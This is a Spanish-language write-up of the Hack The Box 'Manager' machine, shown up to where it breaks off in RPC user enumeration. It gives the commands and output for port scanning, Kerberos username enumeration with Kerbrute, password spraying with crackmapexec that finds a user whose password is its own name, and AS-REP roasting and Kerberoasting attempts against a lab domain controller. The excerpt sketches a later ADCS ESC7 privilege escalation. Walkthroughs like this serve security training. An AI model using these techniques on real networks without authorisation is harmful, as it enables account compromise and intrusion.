---
title: "Manager - Hack The Box"
date: 2024-10-12
draft: false
slug: "htb-writeup-manager"
excerpt: "Esta fue una máquina no tan difícil como esperaba, pero interesante en la forma de escalar privilegios. Empezamos por analizar la página web activa, pero al no encontrar nada útil, pasamos a enumerar los servicios activos, que el que más nos ayudó fue el servicio Kerberos, ya que usamos Kerbrute para obtener una lista de usuarios válidos a los que les aplicamos fuerza bruta, para ver si alguno de estos ocupa su mismo nombre de usuario como contraseña, siendo que si hayamos un usuario que hace esto. Gracias a este usuario, logramos obtener acceso al servicio MSSQL que tiene activado el comando xp_dirtree. Esto nos permitió enumerar algunos directorios locales de la máquina, encontrando así un backup en los archivos de la página web, dentro de la ruta /inetpub/wwroot. Dentro del backup, hay un archivo oculto que contiene la contraseña de otro usuario, que tiene acceso a WinRM y es el que usaremos para conectarnos a este servicio usando Evil-WinRM. Para enumerar el AD, ocuparemos adPEAS dentro de la sesión de Evil-WinRM, este encontrará que el usuario actual, tiene el permiso ManageCA, lo que nos permitiría crear un certificado falso del administrador, con el que podremos obtener su hash NT usando la herramienta certipy, siendo así como escalamos privilegios."
categories: ["HackTheBox", "Medium Machine"]
tags: ["Windows", "Active Directory", "DNS", "Kerberos", "RPC", "LDAP", "MSSQL", "Web Enumeration", "Kerberos Enumeration", "Password Brute Force", "RPC Enumeration", "LDAP Enumeration", "RID Cycling Attack", "MSSQL Enumeration", "Abusign MSSQL with xp_dirtree", "Information Leakage", "AD Enumeration (adPEAS)", "BloodHound and SharpHound Enumeration", "Abusing ADCS (SubCA Template)", "Privesc - ESC7 technique", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "whatweb"
  - "wfuzz"
  - "gobuster"
  - "dig"
  - "crackmapexec"
  - "smbclient"
  - "smbmap"
  - "kerbrute_linux_amd64"
  - "impacket-GetNPUsers"
  - "impacket-GetUserSPNs"
  - "rpcclient"
  - "ldapdomaindump"
  - "python3"
  - "seq"
  - "xargs"
  - "netexec"
  - "impacket-mssqlclient"
  - "xp_dirtree"
  - "adPEAS"
  - "BloodHound 4.3.1"
  - "SharpHound 1.1.1"
  - "Evil-WinRM"
  - "certipy"
  - "ntpdate"
links:
  - "https://medium.com/@nantysean/enumerating-a-corporate-network-with-netexec-7be7537b537d"
  - "https://github.com/ropnop/kerbrute"
  - "https://www.sqlops.com/what-is-xp_dirtree/"
  - "https://github.com/61106960/adPEAS"
  - "https://github.com/ly4k/Certipy"
  - "https://www.reddit.com/r/hackthebox/comments/121sn0q/getting_time_skew_error_when_trying_to_run_psexec/"
  - "https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069"
  - "https://learn.microsoft.com/es-es/windows-server/identity/ad-cs/active-directory-certificate-services-overview"
  - "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation"
  - "https://www.tarlogic.com/es/blog/ad-cs-ataque-esc7/"
  - "https://learn.microsoft.com/es-es/windows-server/identity/ad-cs/certification-authority-role"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-manager/Manager.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.11.236
PING 10.10.11.236 (10.10.11.236) 56(84) bytes of data.
64 bytes from 10.10.11.236: icmp_seq=1 ttl=127 time=67.8 ms
64 bytes from 10.10.11.236: icmp_seq=2 ttl=127 time=71.0 ms
64 bytes from 10.10.11.236: icmp_seq=3 ttl=127 time=68.2 ms
64 bytes from 10.10.11.236: icmp_seq=4 ttl=127 time=67.9 ms

--- 10.10.11.236 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3008ms
rtt min/avg/max/mdev = 67.809/68.738/71.023/1.326 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.236 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-12 21:55 CST
Initiating SYN Stealth Scan at 21:55
Scanning 10.10.11.236 [65535 ports]
Discovered open port 53/tcp on 10.10.11.236
Discovered open port 135/tcp on 10.10.11.236
Discovered open port 80/tcp on 10.10.11.236
Discovered open port 139/tcp on 10.10.11.236
Discovered open port 445/tcp on 10.10.11.236
Discovered open port 49689/tcp on 10.10.11.236
Discovered open port 62362/tcp on 10.10.11.236
Discovered open port 49792/tcp on 10.10.11.236
Discovered open port 88/tcp on 10.10.11.236
Discovered open port 49721/tcp on 10.10.11.236
Discovered open port 49693/tcp on 10.10.11.236
Discovered open port 1433/tcp on 10.10.11.236
Discovered open port 49690/tcp on 10.10.11.236
SYN Stealth Scan Timing: About 45.79% done; ETC: 21:56 (0:00:37 remaining)
Discovered open port 636/tcp on 10.10.11.236
Increasing send delay for 10.10.11.236 from 0 to 5 due to 11 out of 35 dropped probes since last increase.
Discovered open port 3269/tcp on 10.10.11.236
Discovered open port 49667/tcp on 10.10.11.236
Discovered open port 3268/tcp on 10.10.11.236
Discovered open port 9389/tcp on 10.10.11.236
Discovered open port 5985/tcp on 10.10.11.236
Discovered open port 593/tcp on 10.10.11.236
Discovered open port 464/tcp on 10.10.11.236
Increasing send delay for 10.10.11.236 from 5 to 10 due to 11 out of 28 dropped probes since last increase.
Completed SYN Stealth Scan at 21:56, 66.88s elapsed (65535 total ports)
Nmap scan report for 10.10.11.236
Host is up, received user-set (0.27s latency).
Scanned at 2024-10-12 21:55:12 CST for 66s
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
1433/tcp  open  ms-sql-s         syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49689/tcp open  unknown          syn-ack ttl 127
49690/tcp open  unknown          syn-ack ttl 127
49693/tcp open  unknown          syn-ack ttl 127
49721/tcp open  unknown          syn-ack ttl 127
49792/tcp open  unknown          syn-ack ttl 127
62362/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 67.00 seconds
           Raw packets sent: 327642 (14.416MB) | Rcvd: 84 (3.680KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Demasiados puertos abiertos, se pueden ver algunos que son conocidos por pertenecer a un **Directorio Activo (AD)**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49693,49721,49792,49833 10.10.11.236 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-12 21:56 CST
Nmap scan report for manager.htb (10.10.11.236)
Host is up (0.070s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0

| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Manager
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-13 10:57:05Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)

| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2024-10-13T10:58:35+00:00; +7h00m02s from scanner time.
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)

|_ssl-date: 2024-10-13T10:58:36+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM

| ms-sql-ntlm-info: 
|   10.10.11.236:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-10-13T07:09:51
|_Not valid after:  2054-10-13T07:09:51
|_ssl-date: 2024-10-13T10:58:35+00:00; +7h00m02s from scanner time.
| ms-sql-info: 
|   10.10.11.236:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)

|_ssl-date: 2024-10-13T10:58:35+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)

| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2024-10-13T10:58:36+00:00; +7h00m01s from scanner time.
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
49667/tcp open     msrpc         Microsoft Windows RPC
49689/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open     msrpc         Microsoft Windows RPC
49693/tcp open     msrpc         Microsoft Windows RPC
49721/tcp open     msrpc         Microsoft Windows RPC
49792/tcp open     msrpc         Microsoft Windows RPC
49833/tcp filtered unknown
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

| smb2-time: 
|   date: 2024-10-13T10:57:58
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.85 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Es claro que nos vamos a enfrentar a un **AD**. Tenemos muchas formas por donde podemos empezar a enumerar la página.

El escaneo nos mostró el dominio del **AD** y el nombre del servidor. Regístralos en tu **/etc/hosts**:
```bash
nano /etc/hosts
10.10.11.236 manager.htb dc01.manager.htb
```

Vamos a empezar por el **puerto 80**.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-manager/Captura1.png">
</p>

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-manager/Captura2.png">
</p>

No veo algo que nos sea útil.

Quizá **whatweb** muestre algo más:
```bash
whatweb http://10.10.11.236
http://10.10.11.236 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.236], JQuery[3.4.1], Microsoft-IIS[10.0], Script[text/javascript], Title[Manager], X-UA-Compatible[IE=edge]
```
Tampoco veo algo útil.

Veamos si encontramos algo que nos ayude a la intrusión en la página web.

Parece que encontramos un posible usuario:

<p align="center">
<img src="/assets/images/htb-writeup-manager/Captura3.png">
</p>

Es posible que sea un usuario del **AD**, pero no estoy muy seguro.

Siguiendo investigando, encontramos una forma de contactar a la empresa:

<p align="center">
<img src="/assets/images/htb-writeup-manager/Captura4.png">
</p>

Esto es todo lo que hay que ver.

Probemos a aplicar **Fuzzing** para ver si hay algo más por ahí.

### Fuzzing {#fuzz}

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.236/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.236/FUZZ
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000002:   301        1 L      10 W       150 Ch      "images"                                                                                                                                        
000000189:   301        1 L      10 W       150 Ch      "Images"                                                                                                                                        
000000939:   301        1 L      10 W       146 Ch      "js"                                                                                                                                            
000003659:   301        1 L      10 W       150 Ch      "IMAGES"                                                                                                                                        
000009123:   301        1 L      10 W       146 Ch      "JS"                                                                                                                                            
000008461:   301        1 L      10 W       147 Ch      "CSS"                                                                                                                                           
000045226:   200        506 L    1356 W     18203 Ch    "http://10.10.11.236/"                                                                                                                          
000000536:   301        1 L      10 W       147 Ch      "css"                                                                                                                                           

Total time: 0
Processed Requests: 220545
Filtered Requests: 220537
Requests/sec.: 0
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://10.10.11.236/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.236/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 150] [--> http://10.10.11.236/images/]
/Images               (Status: 301) [Size: 150] [--> http://10.10.11.236/Images/]
/css                  (Status: 301) [Size: 147] [--> http://10.10.11.236/css/]
/js                   (Status: 301) [Size: 146] [--> http://10.10.11.236/js/]
/IMAGES               (Status: 301) [Size: 150] [--> http://10.10.11.236/IMAGES/]
/CSS                  (Status: 301) [Size: 147] [--> http://10.10.11.236/CSS/]
/JS                   (Status: 301) [Size: 146] [--> http://10.10.11.236/JS/]
Progress: 220545 / 220546 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

No encontramos nada.

Pasemos a enumerar otros servicios.

### Enumeración de DNS {#DNS}

Veamos qué información podemos obtener del **DNS** con la herramienta **dig**:
```bash
dig @10.10.11.236 manager.htb

; <<>> DiG 9.20.2-1-Debian <<>> @10.10.11.236 manager.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 60228
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;manager.htb.                   IN      A

;; ANSWER SECTION:
manager.htb.            600     IN      A       10.10.11.236

;; Query time: 72 msec
;; SERVER: 10.10.11.236#53(10.10.11.236) (UDP)
;; WHEN: Sat Oct 12 23:27:51 CST 2024
;; MSG SIZE  rcvd: 56
```
Confirmamos el dominio del **AD**.

Probemos si existe algún correo registrado:
```bash
dig @10.10.11.236 manager.htb mx

; <<>> DiG 9.20.2-1-Debian <<>> @10.10.11.236 manager.htb mx
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 5920
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;manager.htb.                   IN      MX

;; AUTHORITY SECTION:
manager.htb.            3600    IN      SOA     dc01.manager.htb. hostmaster.manager.htb. 253 900 600 86400 3600

;; Query time: 68 msec
;; SERVER: 10.10.11.236#53(10.10.11.236) (UDP)
;; WHEN: Sat Oct 12 23:27:56 CST 2024
;; MSG SIZE  rcvd: 92
```
Nada, pero ahí aparece el nombre del servidor del **AD**.

Veamos si hay otro servidor registrado:
```bash
dig @10.10.11.236 manager.htb ns

; <<>> DiG 9.20.2-1-Debian <<>> @10.10.11.236 manager.htb ns
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 49237
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;manager.htb.                   IN      NS

;; ANSWER SECTION:
manager.htb.            3600    IN      NS      dc01.manager.htb.

;; ADDITIONAL SECTION:
dc01.manager.htb.       3600    IN      A       10.10.11.236

;; Query time: 76 msec
;; SERVER: 10.10.11.236#53(10.10.11.236) (UDP)
;; WHEN: Sat Oct 12 23:28:02 CST 2024
;; MSG SIZE  rcvd: 75
```
Ninguno.

Por último, tratemos de aplicar el **ataque de transferencia de zona**:
```bash
dig @10.10.11.236 manager.htb axfr

; <<>> DiG 9.20.2-1-Debian <<>> @10.10.11.236 manager.htb axfr
; (1 server found)
;; global options: +cmd
; Transfer failed.
```
Nada tampoco. Pues solo comprobamos el dominio y el servidor del **AD**.

### Enumeración de Servicio SMB {#SMB}

Usemos **crackmapexec** para obtener información del **servicio SMB**:
```bash
crackmapexec smb 10.10.11.236
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
```
Bien, obtuvimos información del SO y del **AD**.

Tratemos de listar los recursos compartidos usando una sesión nula con **smbclient**:
```bash
smbclient -L //10.10.11.236// -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.236 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Parece que no es muy útil la sesión nula. Necesitaremos credenciales válidas para enumerar este servicio.

Por si las dudas, probemos con **smbmap**:
```bash
smbmap -H 10.10.11.236

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)

|---|---|---|---|---|---|---|---|---|
SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<mailto:ShawnDEvans@gmail.com>
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[*] Closed 1 connections
```
No podremos hacer nada hasta tener credenciales válidas.

### Enumeración de Servicio Kerberos {#kerberos}

Vamos a ir a lo seguro.

Aplicaremos la enumeración del **servicio Kerberos** usando **Kerbrute** para obtener usuarios válidos.

Puedes obtenerlo aquí:
* <a href="https://github.com/ropnop/kerbrute" target="_blank">Repositorio de ropnop: Kerbrute</a>

Usaremos el ataque **userenum** al que le indicaremos la IP, el dominio y un wordlists (use el **xato-net-10-million-usernames.txt de SecLists**):
```bash
./kerbrute_linux_amd64 userenum --dc 10.10.11.236 -d manager.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/12/24 - Ronnie Flathers @ropnop

2024/10/12 23:42:56 >  Using KDC(s):
2024/10/12 23:42:56 >   10.10.11.236:88

2024/10/12 23:42:57 >  [+] VALID USERNAME:       ryan@manager.htb
2024/10/12 23:43:00 >  [+] VALID USERNAME:       guest@manager.htb
2024/10/12 23:43:01 >  [+] VALID USERNAME:       cheng@manager.htb
2024/10/12 23:43:02 >  [+] VALID USERNAME:       raven@manager.htb
2024/10/12 23:43:12 >  [+] VALID USERNAME:       administrator@manager.htb
2024/10/12 23:43:28 >  [+] VALID USERNAME:       Ryan@manager.htb
2024/10/12 23:43:30 >  [+] VALID USERNAME:       Raven@manager.htb
2024/10/12 23:43:37 >  [+] VALID USERNAME:       operator@manager.htb
2024/10/12 23:44:39 >  [+] VALID USERNAME:       Guest@manager.htb
2024/10/12 23:44:40 >  [+] VALID USERNAME:       Administrator@manager.htb
2024/10/12 23:45:33 >  [+] VALID USERNAME:       Cheng@manager.htb
2024/10/12 23:48:00 >  [+] VALID USERNAME:       jinwoo@manager.htb
2024/10/12 23:48:24 >  [+] VALID USERNAME:       RYAN@manager.htb
2024/10/12 23:49:54 >  [+] VALID USERNAME:       RAVEN@manager.htb
2024/10/12 23:49:59 >  [+] VALID USERNAME:       GUEST@manager.htb
```
Tenemos varios usuarios. Cópialos en minúsculas para evitar errores.

Como ya tenemos usuarios válidos, podemos aplicar varias cosillas. Lo principal es ver si no se está ocupando el nombre de un usuario como su contraseña.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Fuerza Bruta con crackmapexec a Usuarios Encontrados {#FBruta}

Podríamos usar **kerbrute** para probar qué usuario tiene su nombre de usuario como contraseña, pero para más rapidez, vamos a usar **crackmapexec**.

Usaremos la lista de usuarios como usuarios y la misma lista como contraseñas, y le indicaremos que no aplique fuerza bruta y que continúe cuando encuentre una validación:
```bash
crackmapexec smb 10.10.11.236 -u users.txt -p users.txt --no-brute --continue-on-success
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [-] manager.htb\zhong:zhong STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\chinhae:chinhae STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\jinwoo:jinwoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator
```
Excelente, encontramos que el **usuario operator** tiene su mismo nombre como contraseña.

Por si las dudas, comprobemos que realmente funciona esta contraseña:
```bash
crackmapexec smb 10.10.11.236 -u 'operator' -p 'operator'
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator
```

Funciona, es decir, que podemos usar este usuario para enumerar el **servicio SMB**:
```bash
smbmap -H 10.10.11.236 -u 'operator' -p 'operator'
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)

|---|---|---|---|---|---|---|---|---|
SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<mailto:ShawnDEvans@gmail.com>
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.11.236:445        Name: manager.htb               Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections
```
Aunque de aquí no obtendremos nada.

#### Aplicando AS-REP Roasting attack (Fallo) {#ASREP}

De igual forma, como ya tenemos una lista de usuarios, podemos aplicar el **AS-REP Roasting attack** y ver si obtenemos el **hash** de un **TGT** de algún usuario.

Utilizamos el **GetNPUsers de impacket**, al que le indicamos el que no tenemos alguna contraseña y que usaremos una lista de usuarios:
```bash
impacket-GetNPUsers -no-pass -usersfile users.txt manager.htb/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[-] User zhong doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ryan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User cheng doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User chinhae doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User raven doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jinwoo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User operator doesn't have UF_DONT_REQUIRE_PREAUTH set
```
Nada, fue un fallo aplicar este ataque.

####  Aplicando Kerberoasting Attack (Fallo) {#kerberoasting}

Como ya tenemos un usuario y contraseña válido, podemos intentar aplicar el **Kerberoasting Attack** para poder obtener un **TGS** e intentar crackearlo.

Usaremos **GetUserSPNs de impacket**, indicándole el dominio y el usuario y contraseña:
```bash
impacket-GetUserSPNs manager.htb/operator:operator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```
No se obtuvo nada. Descartamos este ataque también.

### Enumeración de Servicio RPC {#RPC}

Probemos a entrar al **servicio RPC** con un usuario nulo:
```batch
rpcclient -U "" 10.10.11.236 -N
rpcclient $>
```
Sí podemos.

Empecemos a aplicar enumeración, obteniendo los usuarios y grupos:
```batch
rpcclient -U "" 10.10.11.236 -N
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomgroups
result was NT_STATUS_ACCESS_DENIED
rpcclient $> exit
```
Nada, no podemos ejecutar comandos.

Afortunadamente, ya tenemos un usuario y su contraseña.

Probémoslo:
```batch
rpcclient -U "operator%operator" 10.10.11.236
rpcclient $>
```
Muy bien, si sirve.

Ahora sí, enumeremos primero los usuarios:
```batch
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Zhong] rid:[0x459]
user:[Cheng] rid:[0x45a]
user:[Ryan] rid:[0x45b]
user:[Raven] rid:[0x45c]
user:[JinWoo] rid:[0x45d]
user:[ChinHae] rid:[0x45e]
user:[Operator] rid:[0x45f]
```
Son 7 usuarios que existen (aparte de los usuarios del sistema por defecto).

Obtengamos los grupos:
```batch
rpcclient $> enumdomgroups
